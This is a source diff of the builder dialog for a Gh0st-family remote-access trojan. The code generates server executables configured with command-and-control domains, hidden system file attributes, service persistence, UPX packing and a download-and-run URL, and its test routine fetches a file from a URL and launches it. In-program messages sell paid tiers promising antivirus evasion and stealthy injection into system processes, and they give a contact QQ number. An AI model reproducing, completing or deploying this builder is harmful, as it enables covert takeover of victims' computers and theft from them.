@@ -157,9 +157,6 @@ BOOL CBuild::OnInitDialog()
 {
     CDialog::OnInitDialog();
 
-// 	SetIcon(AfxGetApp()->LoadIcon(IDI_CREATE),FALSE);
-// 	SetIcon(AfxGetApp()->LoadIcon(IDI_CREATE),TRUE);
-
     UpdateData(false);
 
     OnzrppccAz();
@@ -280,7 +277,6 @@ BOOL CBuild::OnInitDialog()
 
     restr= "输入网络文件地址\n（如：http://www.baidu.com/sb360.jpg）。";
     m_tooltip.AddTool(GetDlgItem(IDC_EDIT_KB),restr);
-
 
     return TRUE;  // return TRUE unless you set the focus to a control
     // EXCEPTION: OCX Property Pages should return FALSE
@@ -422,6 +418,7 @@ BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni,
 
     return TRUE;
 }
+
 BOOL DeleteUrlCache(DEL_CACHE_TYPE type)
 {
     BOOL bRet = FALSE;
@@ -479,8 +476,6 @@ int IPorUrl(char *ipaddr)//判断是IP还是域名
 
 char* UrlToIP(LPCSTR ch)
 {
-
-
     // //清internet临时文件
     char szPath[MAX_PATH];
     DeleteUrlCache(File);
@@ -552,8 +547,6 @@ char* UrlToIP(LPCSTR ch)
 
 void CBuild::TestMaster1()
 {
-    // TODO: Add your control notification handler code here
-//	BuildServer	*pThis = (BuildServer *)lparam;
     CString	strResult;
     CString	strResulr = "连接失败... ";
     bool	bRet = true;
@@ -637,8 +630,7 @@ BOOL qqonline(LPCTSTR str)
         _variant_t varp(false);
         char abc[MAX_PATH]= {0};
         wsprintf (abc, "http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s",str);
-// 		char abc[50]="http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=";
-// 		strcat(abc,str);
+
         xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// 初始化即将发送的头部信息
         xmlrequest->send(); // 发送到服务器
         BSTR bstrbody;
@@ -659,7 +651,13 @@ BOOL qqonline(LPCTSTR str)
             SizePoine = SizePoinr - SizePoint;
             Dig.substr(chBuff1,SizePoint,SizePoine);
             strcpy(lpszQQ,chBuff1);
-            int arr[10][15]= {'s','t','u','v','w','x','y','z','a','b','c','d','e','f','g','t','u','v','w','x','y','z','a','b','c','d','e','f','g','h','u','v','w','x','y','z','a','b','c','d','e','f','g','h','i','v','w','x','y','z','a','b','c','d','e','f','g','h','i','j','w','x','y','z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','a','n','o','p','q','r','s','t','u','v','w','x','y','z','a','b','o','p','q','r','s','t','u','v','w','x','y','z','a','b','c','p','q','r','s','t','u','v','w','x','y','z','a','b','c','d','q','r','s','t','u','v','w','x','y','z','a','b','c','d','e'};
+            int arr[10][15]= {'s','t','u','v','w','x','y','z','a','b','c','d','e','f','g','t','u','v','w',
+                'x','y','z','a','b','c','d','e','f','g','h','u','v','w','x','y','z','a','b','c','d','e','f',
+                'g','h','i','v','w','x','y','z','a','b','c','d','e','f','g','h','i','j','w','x','y','z','a',
+                'b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y',
+                'z','a','n','o','p','q','r','s','t','u','v','w','x','y','z','a','b','o','p','q','r','s','t',
+                'u','v','w','x','y','z','a','b','c','p','q','r','s','t','u','v','w','x','y','z','a','b','c',
+                'd','q','r','s','t','u','v','w','x','y','z','a','b','c','d','e'};
             int D[15]= {'r','s','t','u','v','w','x','y','z','a','b','c','d','e','f'};
             char *ipExcp=new char[strlen(lpszQQ)];
             strcpy(ipExcp,lpszQQ);
@@ -689,8 +687,6 @@ BOOL qqonline(LPCTSTR str)
 
 void CBuild::TestMaster2()
 {
-    // TODO: Add your control notification handler code here
-    //	BuildServer	*pThis = (BuildServer *)lparam;
     CString	strResult;
     CString	strResulr = "连接失败... ";
     bool	bRet = true;
@@ -755,7 +751,6 @@ fail:
 
 BOOL CBuild::PreTranslateMessage(MSG* pMsg)
 {
-
     if(pMsg->message   ==   WM_KEYDOWN) {
         switch(pMsg->wParam) {
         case   VK_RETURN://屏蔽回车
@@ -772,8 +767,6 @@ BOOL CBuild::PreTranslateMessage(MSG* pMsg)
 
 void CBuild::OnzrppccAz()
 {
-
-
     BOOL Azlx,Azlx1;
 
     UpdateData(true);
@@ -800,7 +793,6 @@ void CBuild::OnzrppccAz()
     GetDlgItem(IDC_DLL_NAME)->EnableWindow(Azlx);
     GetDlgItem(IDC_FILEALEIXING)->EnableWindow(Azlx1);
     GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(Azlx1);
-
 }
 
 
@@ -852,7 +844,6 @@ void CBuild::OnSelectIco()
     HICON hIcon=(HICON)LoadImage(NULL, dlg.GetPathName(),IMAGE_ICON, 32, 32,LR_LOADFROMFILE);
     m_Ico.SetIcon(hIcon);
     DestroyIcon(hIcon);
-
 }
 
 void CBuild::OnLButtonDown(UINT nFlags, CPoint point)
@@ -930,7 +921,6 @@ bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
     CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 
     return TRUE;
-
 }
 
 void CBuild::OnKbtest()
@@ -970,7 +960,6 @@ void CBuild::OnKbtest()
         return ; //文件下载失败，请检查URL是否正确
     }
     OpenFile(szFile,SW_SHOW);
-
 }
 
 void CBuild::OnKbcheck()
@@ -980,11 +969,11 @@ void CBuild::OnKbcheck()
     if (m_kbcheck) {
         GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
         GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
-    } else {
+    }
+    else {
         GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
         GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
     }
-
 }
 
 
@@ -1004,9 +993,6 @@ HBRUSH CBuild::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 void CBuild::OnExit()
 {
     OnCancel();
-
-    // TODO: Add your control notification handler code here
-
 }
 
 int StormRand(int count)
@@ -1126,67 +1112,8 @@ DLLSERVER_INFO dll_info = {
     0,
     FILE_ATTRIBUTE_NORMAL,    //文件属性
     '"',
-//		"http://192.168.179.128/Consys21.dll"
-
 };
 
-/*
-int CBuildServer::memfind(const char *mem, const char *str, int sizem, int sizes)
-{
-	int   da,i,j;
-	if (sizes == 0) da = strlen(str);
-	else da = sizes;
-	for (i = 0; i < sizem; i++)
-	{
-		for (j = 0; j < da; j ++)
-			if (mem[i+j] != str[j])	break;
-			if (j == da) return i;
-	}
-	return -1;
-}
-
-
-BOOL CBuildServer::CreateServer(DLLSERVER_INFO *lpData,LPSTR szPath,char *datPaths)
-{
-	CopyFile(datPaths,szPath,FALSE);
-
-	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
-		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
-
-	if(m_Handle!=INVALID_HANDLE_VALUE)
-	{
-		DWORD Size = GetFileSize(m_Handle,NULL);
-		char * Buffer = new char[Size];
-		if(Buffer == NULL)
-		{
-			CloseHandle(m_Handle);
-			return FALSE;
-		}
-		DWORD YtesRead=0;
-		DWORD iCount=0;
-		do
-		{
-			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
-			iCount+=YtesRead;
-		}while(iCount<Size);
-
-
-
-		DWORD SizePoint = memfind(Buffer,"www.baidu.com",Size,0);//
-		if(SizePoint != 0)
-		{
-			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
-			DWORD Written=0;
-			MyEncryptFunctionForServer((LPSTR)lpData,sizeof(DLLSERVER_INFO));
-			WriteFile(m_Handle,lpData,sizeof(DLLSERVER_INFO),&Written,NULL);
-		}
-
-		CloseHandle(m_Handle);
-	}
-	return TRUE;
-}
-
-*/
 void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//加密
 {
     unsigned long i;
@@ -1236,12 +1163,9 @@ void CBuild::OnBuild()
         return;
     }
 
-
-
     m_log.ReplaceSel("=> 上线及安装信息正在组合...\r\n");
 
     ZeroMemory(&dll_info,sizeof(DLLSERVER_INFO));
-//	ZeroMemory(&m_OnlineInfo,sizeof(ONLINEINFO));
     strcpy(dll_info.szFinder,"www.swordaa.com");
     strcpy(dll_info.Domain,m_remote_host1.GetBuffer(0));
     strcpy(dll_info.QQDomain,m_remote_host2.GetBuffer(0));
@@ -1257,10 +1181,7 @@ void CBuild::OnBuild()
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "ServiceDisplayName", m_ServiceDisplayName);
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "ServiceDescription", m_ServiceDescription);
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "Host1", m_remote_host1);
-//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "Host3", szFilter);
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "Host2", m_remote_host2);
-//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("服务生成", "Port1", m_remote_port1);   //上线端口 1
-//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("服务生成", "Port2", m_remote_port2);   //上线端口 2
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "Version", m_strVersion);
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "DllName", m_dllname);  //安装名称
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成", "Eexmeux", m_exemeux);  //运行互诉
@@ -1280,18 +1201,11 @@ void CBuild::OnBuild()
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("服务生成","Changurl",m_changurl); //域名转接
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("服务生成","Gdtj",m_gdtj);        //随机途径固定
         ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("服务生成","Meux",m_meux);        //随机互诉
-
     }
-
-
-
 
     strcpy(dll_info.ServiceName,m_ServiceName.GetBuffer(0));   //服务名称
     strcpy(dll_info.ServicePlay,m_ServiceDisplayName.GetBuffer(0));   //服务显示
     strcpy(dll_info.ServiceDesc,m_ServiceDescription.GetBuffer(0));   //服务描述
-//	strcpy(dll_info.URL,"http://192.168.179.128/Consys21.dll");
-
-    //	strcpy(dll_info.szFinder,"www.swordaa.com");
 
     strcpy(dll_info.ReleasePath,m_releasepath.GetBuffer(0));   //写入安装路径
     strcpy(dll_info.ReleaseName,(m_dllname + m_houzuiming).GetBuffer(0));   //写入安装名称
@@ -1307,7 +1221,6 @@ void CBuild::OnBuild()
     if (!m_edit_kb.IsEmpty() && m_kbcheck) {
         strcpy(dll_info.szDownRun,m_edit_kb.GetBuffer(0));
     }
-
 
     CString szTemp;
 
@@ -1329,7 +1242,6 @@ void CBuild::OnBuild()
 
     if(szTemp == "隐藏+系统+只读")
         dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
-
 
     //判断是否加了
     WORD Tail = strlen(dll_info.ReleasePath)-1;
@@ -1360,58 +1272,7 @@ void CBuild::OnBuild()
     ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务生成","InstallPath",m_releasepath);  //安装目录
 
     TCHAR szSaveFile[MAX_PATH]= {0};
-// 	strcpy(szSaveFile, "SB360.exe");//填充默认文件名
-//
-// 	OPENFILENAME ofn;
-// 	ZeroMemory(&ofn,sizeof(ofn));
-// 	ofn.lStructSize = sizeof(ofn);
-// 	ofn.hwndOwner = GetSafeHwnd();
-// 	ofn.lpstrFile = szSaveFile;
-// 	ofn.nMaxFile = sizeof(szSaveFile);
-// 	ofn.lpstrFilter = _T("可执行文件(*.exe*)\0*.exe\0\0");
-// 	ofn.nFilterIndex = 1;
-// 	ofn.lpstrFileTitle = NULL;
-// 	ofn.nMaxFileTitle = 0;
-// 	ofn.lpstrInitialDir = NULL;
-// 	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_OVERWRITEPROMPT;
-// 	if (!GetSaveFileName(&ofn))
-// 	{
-// 		return ;
-// 	}
-
-    /*
-    char BASED_CODE szFilter[] = "可执行文件(*.exe)|*.exe|屏幕保护程序(*.scr)|*.scr|批处理(*.bat)|*.bat|COM(*.com)|*.com|PIF(*.pif)|*.pif||";
-    CFileDialog fdlg(FALSE, "exe", "office", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, szFilter );
-    if(fdlg.DoModal() == IDOK)
-    {
-    	strcpy(szSaveFile, fdlg.GetPathName());
-    }
-
-
-    GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
-    PathRemoveFileSpec(patht);//去除文件名中的gh0st
-    char Datpath[MAX_PATH];
-    sprintf(Datpath,"%s\\Cache\\Install.dat",patht);
-
-    //检测dat文件是否存在
-    if (IsFileExist(Datpath)==FALSE)
-    {
-    	MessageBox("配置文件 Install.dat 不存在,\n请检查文件后再进行配置...", "错误！！", MB_OK | MB_ICONWARNING);
-    	return;
-    }
-
-    m_log.ReplaceSel("=> 文件配置成功，正在写入信息....108 KB\r\n");
-
-    if (CreateServer(&dll_info,szSaveFile,Datpath)==FALSE)
-    {
-    	MessageBox("服务端生成失败!");
-    	return;
-    }
-
-    */
     CString OnInstallWay;
-    //m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay);
-
 
     OPENFILENAME OpenFileName = {0};
     TCHAR szFile[MAX_PATH] = "Server";
@@ -1466,8 +1327,6 @@ void CBuild::OnBuild()
         hFile = CreateFile(strBuildDllPath, GENERIC_ALL, NULL, NULL, OPEN_EXISTING, NULL, NULL);
 
         if (hFile == INVALID_HANDLE_VALUE) {
-
-
             return ;
         }
 
@@ -1475,10 +1334,6 @@ void CBuild::OnBuild()
 
         if (dwFileSize == 0) {
             CloseHandle(hFile);
-
-
-
-
             return ;
         }
 
@@ -1490,10 +1345,6 @@ void CBuild::OnBuild()
             HeapFree(GetProcessHeap(), NULL, pDllData);
 
             CloseHandle(hFile);
-
-
-
-
             return ;
         }
 
@@ -1515,8 +1366,6 @@ void CBuild::OnBuild()
 
             DeleteFile(strBuildDllPath);
             MessageBox("生成完毕");
-
-
         }
     }
     //生成图标
@@ -1535,25 +1384,18 @@ void CBuild::OnBuild()
     CString SCminc;
     if (m_upx) {
         if(CompressUpx(szSaveFile))//UPX压缩
-//			SCminc="文件压缩成功!";
             m_log.ReplaceSel("=> 文件压缩成功...\r\n");
         else
-//			SCminc="文件压缩失败!";
             m_log.ReplaceSel("=> 文件压缩失败...\r\n");
 
     } else {
-//		SCminc="文件生成成功!";
         m_log.ReplaceSel("=> 文件生成成功！,已生成服务程序...108 KB\r\n");
     }
 
     CString szTempTips;
     szTempTips.Format("=> 保存在，%s",szSaveFile);
-//	MessageBox(szTempTips,SCminc,MB_OK|MB_ICONINFORMATION);
 
     m_log.ReplaceSel(szTempTips+"\r\n");
-
-
-//   OnOK();
 }
 
 BOOL CBuild::IsFileExist(LPCTSTR strFileName)
@@ -1568,7 +1410,6 @@ BOOL CBuild::IsFileExist(LPCTSTR strFileName)
 
 BOOL CBuild::CompressUpx(CString inpath)
 {
-
     GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
     PathRemoveFileSpec(patht);//去除文件名中的gh0st
 
@@ -1716,8 +1557,6 @@ int basenew64_newdecode(const char *str, char **data)
 
 char* NewDecode(char *str)
 {
-
-
     int a,b;
     char *fucker = NULL;
     b = basenew64_newdecode(str, &fucker);
@@ -1759,10 +1598,6 @@ void CBuild::OnHuoquZp() //获取钻石配置
     if ( struser.GetLength() != NULL ) {
         m_zs_build.EnableWindow(TRUE);
     } else {
-        // 		if (MessageBox("免费测试版不能使用隐藏启动！！！请联系管理员或登录官方QQ群开通更高版本！/n注册版说明：/n①用户可以永久使用远控控制，且所有功能不受限制。/n②增加了专属的插入系统进程服务启动，优点是隐藏性极强。", "警告", MB_OK) == IDOK)
-        // 		{
-        // 			m_zc_build.EnableWindow(FALSE);
-        // 		}
         m_log.ReplaceSel("=> 免费测试版与注册版用户不能使用〓钻石版通道〓...\r\n=> 请联系管理员或登录官方QQ群开通更高版本！\r\n");
         m_log.ReplaceSel("=> 钻石版说明：\r\n=> ① 钻石用户可以享受注册版的所有服务。\r\n=> ② 增加了钻石专属的智能检测杀毒，且躲避杀软无提示启动上线。\r\n");
         m_log.ReplaceSel("=> ③ 可以享受一个星期一次的免杀更新服务...\r\n=> ④ 有远控技术问题可随时联系管理员，管理员提供VIP服务！\r\n");
@@ -1770,7 +1605,6 @@ void CBuild::OnHuoquZp() //获取钻石配置
         m_log.ReplaceSel("=> 开通钻石版费用RMB：500元/月，唯一客服QQ：826338442...\r\n");
         m_zs_build.EnableWindow(FALSE);
     }
-
 
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////
     DeleteFile("C:\\WINDOWS\\WIN32.cc");
@@ -1784,14 +1618,6 @@ void CBuild::OnHuoquZp() //获取钻石配置
     if ( user.GetLength() != 0 ) {
         strcpy( zhanghao,NewDecode((char *)user.GetBuffer(0)));
     }
-// 	GetDlgItemText(IDC_USER,zhanghao,sizeof(zhanghao));
-// 	GetDlgItemText(IDC_PASS,mima,sizeof(mima));
-// 	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
-// 	{
-// 		MessageBox("请填写Vip账号\\Vip密码","错误",NULL);
-// 	    return;
-// 	}
-    // TODO: Add your control notification handler code here
     char TmpPath[MAX_PATH];
     GetTempPath( sizeof(TmpPath), TmpPath );
     lstrcatA( TmpPath, "\\WindsTemp.exe" );
@@ -1816,13 +1642,11 @@ void CBuild::OnHuoquZp() //获取钻石配置
     serverAddr.sin_family = AF_INET;
     char tgtIP[30] = {0};
     struct hostent *hp = NULL;
-//	m_inifile.SetString( "HOSTNAME", "hostname",(char *)m_hostname.GetBuffer(0));
     CString MyHostName = m_inifile.GetString( "HOSTNAME", "hostname", "" );
     char hostname[50];
     if ( MyHostName.GetLength() != 0 ) {
         strcpy( hostname,NewDecode((char *)MyHostName.GetBuffer(0)));
     }
-//	if ((hp = gethostbyname("182.92.102.86")) != NULL)
     if ((hp = gethostbyname(hostname)) != NULL) {
         in_addr in;
         memcpy(&in, hp->h_addr, hp->h_length);
@@ -1897,8 +1721,6 @@ void CBuild::OnHuoquZp() //获取钻石配置
     WSACleanup();
     MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");
 
-//	SetDlgItemText(IDC_EDIT_HOST,strInfo);
-//	GetDlgItem(IDOK)->EnableWindow(TRUE);
     GetDlgItem(IDC_HUOQU_ZP)->EnableWindow(FALSE);
     Sleep(3000);
     m_zs_build.EnableWindow(TRUE);
@@ -1913,10 +1735,6 @@ void CBuild::OnHuoquCp() //获取注册配置
     if ( struser.GetLength() != NULL ) {
         m_zc_build.EnableWindow(TRUE);
     } else {
-// 		if (MessageBox("免费测试版不能使用隐藏启动！！！请联系管理员或登录官方QQ群开通更高版本！/n注册版说明：/n①用户可以永久使用远控控制，且所有功能不受限制。/n②增加了专属的插入系统进程服务启动，优点是隐藏性极强。", "警告", MB_OK) == IDOK)
-// 		{
-// 			m_zc_build.EnableWindow(FALSE);
-// 		}
         m_log.ReplaceSel("=> 免费测试版不能使用★注册版通道★...\r\n=> 请联系管理员或登录官方QQ群开通更高版本！\r\n");
         m_log.ReplaceSel("=> 注册版说明：\r\n=> ① 注册用户可以永久使用远控控制，且所有功能不受限制。\r\n=> ② 增加了Gh0st经典的插入系统进程服务启动，优点是隐藏性极强（无独立进程，不易被发现！），存活率高。\r\n");
         m_log.ReplaceSel("=> ③ 可以享受一个月一次的免杀更新服务...\r\n=> ④ 有问题可随时联系管理员，管理员提供答疑服务！\r\n");
@@ -1936,13 +1754,6 @@ void CBuild::OnHuoquCp() //获取注册配置
     if ( user.GetLength() != 0 ) {
         strcpy( zhanghao,NewDecode((char *)user.GetBuffer(0)));
     }
-// 	GetDlgItemText(IDC_USER,zhanghao,sizeof(zhanghao));
-// 	GetDlgItemText(IDC_PASS,mima,sizeof(mima));
-// 	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
-// 	{
-// 		MessageBox("请填写Vip账号\\Vip密码","错误",NULL);
-// 	    return;
-// 	}
     // TODO: Add your control notification handler code here
     char TmpPath[MAX_PATH];
     GetTempPath( sizeof(TmpPath), TmpPath );
@@ -1968,13 +1779,11 @@ void CBuild::OnHuoquCp() //获取注册配置
     serverAddr.sin_family = AF_INET;
     char tgtIP[30] = {0};
     struct hostent *hp = NULL;
-//	m_inifile.SetString( "HOSTNAME", "hostname",(char *)m_hostname.GetBuffer(0));
     CString MyHostName = m_inifile.GetString( "HOSTNAME", "hostname", "" );
     char hostname[50];
     if ( MyHostName.GetLength() != 0 ) {
         strcpy( hostname,NewDecode((char *)MyHostName.GetBuffer(0)));
     }
-//	if ((hp = gethostbyname("182.92.102.86")) != NULL)
     if ((hp = gethostbyname(hostname)) != NULL) {
         in_addr in;
         memcpy(&in, hp->h_addr, hp->h_length);
@@ -2049,8 +1858,6 @@ void CBuild::OnHuoquCp() //获取注册配置
     WSACleanup();
     MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");
 
-//	SetDlgItemText(IDC_EDIT_HOST,strInfo);
-//	GetDlgItem(IDOK)->EnableWindow(TRUE);
     GetDlgItem(IDC_HUOQU_CP)->EnableWindow(FALSE);
 
     m_zc_build.EnableWindow(TRUE);
